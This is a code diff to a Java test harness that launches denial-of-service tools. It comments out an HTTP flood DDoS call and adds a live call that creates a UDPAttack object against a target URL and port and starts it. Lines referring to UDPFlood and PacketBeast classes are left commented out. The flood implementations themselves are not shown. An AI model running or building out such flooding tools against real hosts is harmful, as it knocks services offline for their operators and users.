@@ -11,12 +11,22 @@ public class Tester {
         String port = "5056";
 
         //Test of HTTP FLOOD DDOS
-        HTTPFloodDDos httpFloodDdos = new HTTPFloodDDos(url,port);
-                    //httpFloodDdos.startHTTPFloodDDos(url,port);
-
+        //HTTPFloodDDos httpFloodDdos = new HTTPFloodDDos(url,port);
 
         //Test of HTTP FLOOD DOS
         //HTTPFloodDos httpFloodDos = new HTTPFloodDos(url, port, 3, 2000);
 
+        //Test of UDP FLOOD DOS
+        //UDPFlood udpflood = new UDPFlood(url, Integer.parseInt(port) );
+
+        //Attack attack = new UDPFlood(url, Integer.parseInt(port));
+        //Attack.begin(50, attack);
+
+
+        //PacketBeast pBeast = new PacketBeast();
+        //String output = pBeast.setInput( url, "10");
+        UDPAttack ua =new UDPAttack(url); //<--- check the format of the ip
+        ua.start();
+        //udpflood.run();
     }
 }
